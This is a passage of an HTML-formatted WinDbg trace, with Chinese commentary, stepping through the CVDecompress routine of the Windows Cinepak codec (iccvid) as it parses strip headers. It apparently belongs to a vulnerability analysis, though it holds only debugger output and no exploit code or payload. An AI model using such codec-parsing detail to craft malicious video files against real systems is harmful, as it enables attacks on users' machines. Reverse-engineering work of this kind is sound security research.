class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6923=<span class="number">00</span> <span class="comment">; ch = 0x00,第3个Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6924=<span class="number">00</span> <span class="comment">; cl = 0x00,第3个Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 判断剩余未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000003e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6922=<span class="number">11</span> <span class="comment">; al = 0x11,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">0</span>] <span class="comment">; 相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72271 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc3</span>:</span><br><span class="line">73b72271 3c11            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">11h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72273 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc5</span>:</span><br><span class="line">73b72273 0f8557010000    <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x222</span> (73b723d0)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存Size of strip data减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出Size of strip data减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba692a=<span class="number">41</span> <span class="comment">; ah = 0x41,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6926=<span class="number">41</span> <span class="comment">; ch = 0x41,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span 